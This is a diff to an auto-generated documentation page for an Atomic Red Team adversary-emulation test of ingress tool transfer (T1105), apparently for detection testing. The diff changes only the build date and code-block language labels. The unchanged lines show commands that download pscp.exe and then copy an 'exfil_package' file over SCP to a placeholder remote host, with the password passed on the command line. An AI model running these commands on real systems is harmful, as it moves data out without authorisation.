@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1105"
 attack_technique_name: "Ingress Tool Transfer"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "c82b1e60-c549-406f-9b00-0a8ae31c9cfe"
@@ -94,13 +94,13 @@ pscp.exe must be available on the system.
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path #{pscp_binary}) {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
 Invoke-WebRequest "#{pscp_url}" -Outfile "PathToAtomicsFolder\..\ExternalPayloads\pscp.exe"
 ```
@@ -112,14 +112,14 @@ Invoke-WebRequest "#{pscp_url}" -Outfile "PathToAtomicsFolder\..\ExternalPayload
 
 ### Command
 
-```commandprompt
+```cmd
 fsutil file createnew C:\Temp\T1105_scp.zip 1048576
 echo y | #{pscp_binary} -P #{scp_port} -pw #{scp_password} #{exfil_package} #{scp_user}@#{target_location}:#{target_filename}
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 del /f /q #{exfil_package}
 ```
 
